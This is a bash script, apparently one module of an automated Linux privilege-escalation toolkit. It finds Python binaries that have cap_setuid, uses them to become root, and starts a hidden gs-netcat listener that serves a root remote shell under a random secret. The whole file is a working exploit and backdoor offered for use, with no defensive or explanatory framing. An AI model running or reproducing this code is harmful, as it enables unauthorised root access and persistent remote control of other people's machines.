#!/bin/bash
source "$(dirname "$0")/00_common.sh"
M="caps"
info "Checking capabilities..."
caps=$(getcap -r / 2>/dev/null|grep -E 'cap_setuid|cap_setgid')
[ -z "$caps" ] && { result "$M" "skip" "None" ""; exit 1; }
while read -r line; do
    bin=$(echo "$line"|cut -d' ' -f1)
    case "$(basename $bin)" in
        python*) s=$(cat /dev/urandom|tr -dc 'a-z0-9'|head -c20); "$bin" -c "import os;os.setuid(0);os.system('nohup gs-netcat -s $s -l -i &')" 2>/dev/null && { result "$M" "success" "$bin" "$s"; exit 0; };;
    esac
done <<< "$caps"
result "$M" "fail" "No exploit" ""; exit 1
